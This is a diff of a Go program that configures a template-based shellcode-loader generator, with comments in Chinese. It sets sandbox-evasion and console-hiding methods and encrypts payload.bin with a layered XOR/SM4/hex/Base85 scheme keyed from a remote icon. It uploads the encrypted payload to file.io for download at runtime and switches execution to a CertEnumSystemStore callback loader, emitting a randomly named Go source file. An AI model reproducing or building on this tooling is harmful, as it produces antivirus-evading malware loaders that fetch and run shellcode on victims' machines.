@@ -6,7 +6,7 @@ import (
 	"variant/build"
 	"variant/crypto"
 	"variant/dynamic"
-	"variant/enc"
+	"variant/encoder"
 	"variant/log"
 	"variant/network"
 	"variant/rand"
@@ -18,33 +18,35 @@ func main() {
 	sandbox := render.SandBox{
 		Methods: []string{
 			"sandbox.BootTime",
-			"sandbox.GetDesktopFiles",
+			"sandbox.HideConsoleW32",
 		}}
 
-	dy := render.Dynamic{
-		Import:        "variant/dynamic",
-		DynamicUrl:    dynamic.CtIcoUrl,
-		DynamicMethod: "dynamic.GetIcoHex",
-		DynamicKey:    rand.RStrings(),
-		KeyStart:      0,
-		KeyEnd:        8,
-		DynamicIV:     rand.RStrings(),
-		IVStart:       10,
-		IVEnd:         18,
+	d := render.Dynamic{
+		Import:         "variant/dynamic",
+		DynamicUrl:     dynamic.RandomICO(),
+		DynamicMethod:  "dynamic.AesKey",
+		DynamicKey:     rand.RStrings(),
+		DecryptDynamic: "crypto.XorSm4HexBase85Decrypt",
+		MainDynamic:    rand.RStrings(),
+		KeyStart:       0,
+		KeyEnd:         8,
+		DynamicIV:      rand.RStrings(),
+		IVStart:        10,
+		IVEnd:          18,
 	}
 
 	loader := render.Loader{
-		Method: "loader.UuidFromStringLoad",
-		Hide:   "loader.HideConsoleW32",
+		Import: "variant/cloader",
+		Method: "cloader.CertEnumSystemStore",
 	}
 
 	// 设置加密参数
-	params := enc.Payload{
-		PlainText: "render/templates/payload.bin",
+	params := encoder.Payload{
+		PlainText: "output/payload.bin",
 		FileName:  rand.RStrings(),
 		Path:      "output",
-		Key:       dynamic.GetIcoHex(dy.DynamicUrl, dy.KeyStart, dy.KeyEnd),
-		IV:        dynamic.GetIcoHex(dy.DynamicUrl, dy.IVStart, dy.IVEnd),
+		Key:       dynamic.AesKey(d.DynamicUrl, d.KeyStart, d.KeyEnd),
+		IV:        dynamic.AesKey(d.DynamicUrl, d.IVStart, d.IVEnd),
 	}
 	// 加密之后的 shellcode
 	payload, _ := params.SetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
@@ -57,7 +59,7 @@ func main() {
 	}
 
 	// 设置远程加载渲染模板
-	remoteSet := render.Remote{
+	r := render.Remote{
 		Import: "variant/network",
 		Method: "network.FileIORead",
 		Url:    fi.FileIOUpload(),
@@ -65,24 +67,23 @@ func main() {
 
 	// 定义模板渲染数据
 	data := render.Data{
-		CipherText:    rand.RStrings(),
-		PlainText:     rand.RStrings(),
-		DecryptMethod: "crypto.XorSm4HexBase85Decrypt",
-		Loader:        loader,
-		Dynamic:       dy,
-		Remote:        remoteSet,
-		SandBox:       sandbox,
+		CipherText: rand.RStrings(),
+		PlainText:  rand.RStrings(),
+		Loader:     loader,
+		Dynamic:    d,
+		Remote:     r,
+		SandBox:    sandbox,
 	}
 
 	// 设置模板的渲染参数
 	tOpts := render.TmplOpts{
-		TmplFile:     "render/templates/v4/Base.tmpl",
+		TmplFile:     "render/templates/v5/Base.tmpl",
 		OutputDir:    "output",
 		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
 		Data:         data,
 	}
 	// 生成模板
-	err := render.TmplRender(tOpts)
+	err := tOpts.TmplRender()
 	if err != nil {
 		log.Fatal(err)
 	}
